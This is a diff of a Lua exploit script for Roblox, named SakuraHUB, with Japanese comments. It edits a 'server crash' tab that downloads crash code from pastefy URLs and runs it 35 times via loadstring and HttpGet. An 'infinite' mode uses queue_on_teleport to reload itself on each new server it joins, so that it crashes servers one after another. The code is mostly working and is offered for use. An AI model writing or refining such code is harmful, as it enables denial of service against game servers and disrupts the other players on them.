@@ -4578,13 +4578,13 @@ do
     -- ========================================================================
     -- 定数
     -- ========================================================================
-    local CRASH_URL = "https://pastefy.app/sPciZuXM/raw"
-    local SELF_URL  = "https://pastefy.app/uPime032/raw"   -- 無限ループ用（次のサーバーで実行）
-    local CHAT_HEADER = "SakuraHUB-by-Nuked"
+    local CRASH_URL     = "https://pastefy.app/sPciZuXM/raw"   -- クラッシュ単独（35回連続）
+    local AUTOLOGIC_URL = "https://pastefy.app/uPime032/raw"   -- オート無限ループ用（自己完結）
+    local CHAT_HEADER   = "SakuraHUB-by-Nuked"
     local CRASH_LOOP_COUNT = 35
 
     -- ========================================================================
-    -- HTTP取得（game:HttpGet / HttpGet 両対応）
+    -- HTTP取得
     -- ========================================================================
     local function safeHttpGet(url)
         if type(game.HttpGet) == "function" then
@@ -4601,15 +4601,12 @@ do
     -- チャット送信（2方式：TextChatService + レガシー）
     -- ========================================================================
     local function sendChatMessage(message)
-        -- 方式1: TextChatService（SendAsync）
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
             pcall(function()
                 local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
                 gc:SendAsync(message)
             end)
         end
-
-        -- 方式2: レガシーチャット（SayMessageRequest）
         local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
         if events then
             local smr = events:FindFirstChild("SayMessageRequest")
@@ -4620,7 +4617,7 @@ do
     end
 
     -- ========================================================================
-    -- クラッシュスクリプト実行（35回連続）
+    -- クラッシュスクリプト実行（単独・35回）
     -- ========================================================================
     local function runCrashScript()
         local ok, err = pcall(function()
@@ -4726,14 +4723,15 @@ do
     CrashTab:AddSection({ Name = "試験実行" })
 
     -- ========================================================================
-    -- ① サーバークラッシュテスト（35回連続）
+    -- ① 単独（クラッシュテスト）
+    --    sPciZuXM を35回実行するだけ。テレポートしない。
     -- ========================================================================
     CrashTab:AddButton({
-        Name = "⚡ サーバークラッシュテスト（35回連続実行）",
+        Name = "⚡ サーバークラッシュテスト（単独・35回連続実行）",
         Callback = function()
             PlayActionSound()
             OrionLib:MakeNotification({
-                Name = "サーバークラッシュテスト",
+                Name = "単独クラッシュテスト",
                 Content = "35回連続実行を開始します...",
                 Time = 3
             })
@@ -4759,40 +4757,12 @@ do
     })
 
     -- ========================================================================
-    -- ② サーバークラッシュオートモード（単発）
-    -- ========================================================================
-    CrashTab:AddButton({
-        Name = "サーバークラッシュオートモード",
-        Callback = function()
-            PlayActionSound()
-            runCountdownOnce(function()
-                task.spawn(function() teleportToAnotherServer() end)
-                task.wait(0.1)
-                task.spawn(function()
-                    local ok, err = runCrashScript()
-                    if ok then
-                        PlayActionSound()
-                        OrionLib:MakeNotification({
-                            Name = "完了",
-                            Content = "クラッシュ実行・別サーバーへ移動中",
-                            Time = 4
-                        })
-                    else
-                        PlayErrorSound()
-                        OrionLib:MakeNotification({
-                            Name = "エラー",
-                            Content = "失敗: " .. tostring(err),
-                            Time = 5
-                        })
-                    end
-                end)
-            end)
-        end
-    })
-
-    -- ========================================================================
-    -- ③ サーバークラッシュオートモード（無限ループ）
-    --    SELF_URL を queue_on_teleport に渡して次のサーバーで再実行
+    -- ② オート無限
+    --    1回目（このサーバー）：
+    --      カウントダウン → uPime032 を queue_on_teleport に予約
+    --      テレポート発火 → このサーバーでも sPciZuXM（35回）を実行
+    --    2回目以降（新サーバー）：
+    --      uPime032 が自動ロード → カウントダウン・クラッシュ・テレポート・自己予約を担当
     -- ========================================================================
     CrashTab:AddButton({
         Name = "🔁 サーバークラッシュオートモード（無限ループ）",
@@ -4809,39 +4779,44 @@ do
                 return
             end
 
-            local count = (_G.SakuraCrashLoopCount or 0) + 1
-            _G.SakuraCrashLoopCount = count
-
             OrionLib:MakeNotification({
-                Name = "🔁 無限ループ実行",
-                Content = string.format("%d 回目のループを開始", count),
+                Name = "🔁 オート無限",
+                Content = "カウントダウン開始 → このサーバーでも35回クラッシュを実行します",
                 Time = 3
             })
 
             runCountdownOnce(function()
-                -- 次のサーバーでの自動実行を予約
+                -- 次のサーバーで uPime032 を単純にロードするだけ予約
                 local nextScript = string.format([[
-_G.SakuraCrashLoopCount = %d
 loadstring(game:HttpGet("%s"))()
-]], count, SELF_URL)
-                callQueueOnTeleport(nextScript)
+]], AUTOLOGIC_URL)
+                local ok = callQueueOnTeleport(nextScript)
+                if not ok then
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "エラー",
+                        Content = "queue_on_teleport の予約に失敗しました",
+                        Time = 4
+                    })
+                    return
+                end
 
-                -- テレポート発火
+                -- テレポート発火（クラッシュより先）
                 task.spawn(function() teleportToAnotherServer() end)
                 task.wait(0.1)
 
-                -- クラッシュ実行
+                -- このサーバーでも sPciZuXM（35回）を実行
                 task.spawn(function()
-                    local ok, err = runCrashScript()
-                    if ok then
+                    local crashOk = runCrashScript()
+                    if crashOk then
                         PlayActionSound()
-                    else
-                        PlayErrorSound()
                         OrionLib:MakeNotification({
-                            Name = "エラー",
-                            Content = tostring(err),
+                            Name = "初回クラッシュ実行",
+                            Content = "uPime032 を予約済み・別サーバーへ移動中",
                             Time = 4
                         })
+                    else
+                        PlayErrorSound()
                     end
                 end)
             end)
@@ -4849,46 +4824,19 @@ loadstring(game:HttpGet("%s"))()
     })
 
     -- ========================================================================
-    -- ④ ループ回数リセット
-    -- ========================================================================
-    CrashTab:AddButton({
-        Name = "🔄 ループ回数をリセット",
-        Callback = function()
-            PlayActionSound()
-            _G.SakuraCrashLoopCount = 0
-            OrionLib:MakeNotification({
-                Name = "リセット完了",
-                Content = "ループ回数を 0 にリセットしました",
-                Time = 3
-            })
-        end
-    })
-
-    -- ========================================================================
-    -- ⑤ 現在のループ回数確認
-    -- ========================================================================
-    CrashTab:AddButton({
-        Name = "📊 現在のループ回数を確認",
-        Callback = function()
-            PlayActionSound()
-            OrionLib:MakeNotification({
-                Name = "ループ状況",
-                Content = string.format("現在 %d 回目です", _G.SakuraCrashLoopCount or 0),
-                Time = 4
-            })
-        end
-    })
-
-    -- ========================================================================
-    -- 情報表示
+    -- 情報
     -- ========================================================================
     CrashTab:AddSection({ Name = "情報" })
     CrashTab:AddParagraph(
-        "無限ループの仕組み",
-        "「🔁 サーバークラッシュオートモード（無限ループ）」を押すと、\n" ..
-        "カウントダウン → クラッシュ → 別サーバー移動 を実行し、\n" ..
-        "queue_on_teleport により次のサーバーで同じスクリプトが自動実行されます。\n" ..
-        "これにより理論上は無限に繰り返されます。"
+        "使い分け",
+        "① 単独: sPciZuXM を35回実行（このサーバーで完結）\n" ..
+        "② オート無限: カウントダウン → uPime032 を予約 → テレポート発火 → このサーバーで35回クラッシュ\n" ..
+        "   新サーバー到着後、uPime032 がカウントダウン・クラッシュ・テレポート・自己予約を行い無限ループ。"
+    )
+    CrashTab:AddParagraph(
+        "使用URL",
+        "・クラッシュ単独: " .. CRASH_URL .. "\n" ..
+        "・オート無限: " .. AUTOLOGIC_URL
     )
     CrashTab:AddParagraph(
         "注意事項",
